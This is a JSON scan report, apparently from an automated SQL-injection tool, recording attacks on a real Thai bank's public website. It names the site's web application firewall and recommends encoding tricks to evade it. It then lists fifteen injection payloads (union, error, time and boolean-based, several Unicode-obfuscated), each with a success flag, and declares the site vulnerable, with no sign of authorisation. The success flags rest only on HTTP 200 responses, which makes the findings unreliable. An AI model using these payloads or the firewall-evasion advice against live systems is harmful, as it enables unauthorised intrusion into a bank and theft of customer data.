@@ -1,0 +1,152 @@
+{
+  "target_url": "https://www.krungsri.com/th/personal",
+  "timestamp": "2025-10-27 14:06:40",
+  "waf_analysis": {
+    "detected_waf": "incapsula",
+    "confidence": 65,
+    "all_scores": {
+      "cloudflare": 35,
+      "incapsula": 65,
+      "akamai": 15,
+      "modsecurity": 15,
+      "unknown": 15
+    },
+    "recommendation": "检测到incapsula WAF，建议使用['space2comment', 'charunicodeencode', 'percentage']绕过"
+  },
+  "test_results": {
+    "page": [
+      {
+        "payload": "'/**/UNION/**/SELECT/**/NULL,NULL,NULL--/**/",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.1597659587860107,
+        "status_code": 200,
+        "waf_type": "incapsula"
+      },
+      {
+        "payload": "' %u0055%u004e%u0049%u004f%u004e %u0053%u0045%u004c%u0045%u0043%u0054 %u0031,%u0032,%u0033-- ",
+        "type": "unknown",
+        "success": false,
+        "response_time": 3.187354803085327,
+        "status_code": 200,
+        "waf_type": "incapsula"
+      },
+      {
+        "payload": "' AND extractvalue(rand(),concat(0x3a,version()))-- ",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.4469735622406006,
+        "status_code": 200,
+        "waf_type": "incapsula"
+      },
+      {
+        "payload": "'%20AND%20SLEEP(5)--%20",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.1741385459899902,
+        "status_code": 200,
+        "waf_type": "incapsula"
+      },
+      {
+        "payload": "' UNION SELECT 1,2,3-- ",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.1713945865631104,
+        "status_code": 200,
+        "waf_type": "incapsula"
+      },
+      {
+        "payload": "' UNION ALL SELECT 1,2,3-- ",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.1445355415344238,
+        "status_code": 200,
+        "waf_type": "incapsula"
+      },
+      {
+        "payload": "'/**/AND/**/BENCHMARK(50000000,MD5('test'))--/**/",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.1736104488372803,
+        "status_code": 200,
+        "waf_type": "incapsula"
+      },
+      {
+        "payload": "' %u0041%u004e%u0044 (%u0053%u0045%u004c%u0045%u0043%u0054 * %u0046%u0052%u004f%u004d (%u0053%u0045%u004c%u0045%u0043%u0054(%u0053%u004c%u0045%u0045%u0050(%u0035)))%u0061)-- ",
+        "type": "unknown",
+        "success": false,
+        "response_time": 3.352299928665161,
+        "status_code": 200,
+        "waf_type": "incapsula"
+      },
+      {
+        "payload": "'%20UNION%20ALL%20SELECT%201,2,3--%20",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.1464226245880127,
+        "status_code": 200,
+        "waf_type": "incapsula"
+      },
+      {
+        "payload": "' %u0041%u004e%u0044 %u0065%u0078%u0074%u0072%u0061%u0063%u0074%u0076%u0061%u006c%u0075%u0065(%u0072%u0061%u006e%u0064(),%u0063%u006f%u006e%u0063%u0061%u0074(%u0030%u0078%u0033%u0061,%u0076%u0065%u0072%u0073%u0069%u006f%u006e()))-- ",
+        "type": "unknown",
+        "success": false,
+        "response_time": 3.2887887954711914,
+        "status_code": 200,
+        "waf_type": "incapsula"
+      },
+      {
+        "payload": "' AND SLEEP(5)-- ",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.150325059890747,
+        "status_code": 200,
+        "waf_type": "incapsula"
+      },
+      {
+        "payload": "' AND updatexml(rand(),concat(0x3a,version()),null)-- ",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.1964259147644043,
+        "status_code": 200,
+        "waf_type": "incapsula"
+      },
+      {
+        "payload": "'%20AND%20(SELECT%201%20FROM%20(SELECT%20count(*),concat(version(),floor(rand(0)*2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)--%20",
+        "type": "boolean_based",
+        "success": true,
+        "response_time": 1.671879529953003,
+        "status_code": 200,
+        "waf_type": "incapsula"
+      },
+      {
+        "payload": "'/**/AND/**/SLEEP(5)--/**/",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.1677966117858887,
+        "status_code": 200,
+        "waf_type": "incapsula"
+      },
+      {
+        "payload": "' %u0041%u004e%u0044 %u0075%u0070%u0064%u0061%u0074%u0065%u0078%u006d%u006c(%u0072%u0061%u006e%u0064(),%u0063%u006f%u006e%u0063%u0061%u0074(%u0030%u0078%u0033%u0061,%u0076%u0065%u0072%u0073%u0069%u006f%u006e()),%u006e%u0075%u006c%u006c)-- ",
+        "type": "unknown",
+        "success": false,
+        "response_time": 3.0069103240966797,
+        "status_code": 200,
+        "waf_type": "incapsula"
+      }
+    ]
+  },
+  "security_analysis": {
+    "risk_level": "medium",
+    "success_rate": 33.33333333333333,
+    "total_tests": 15,
+    "successful_tests": 5,
+    "recommendation": "建议修复SQL注入漏洞",
+    "vulnerable_types": [
+      "union_based",
+      "boolean_based"
+    ]
+  },
+  "local_ai_enhanced": true
+}
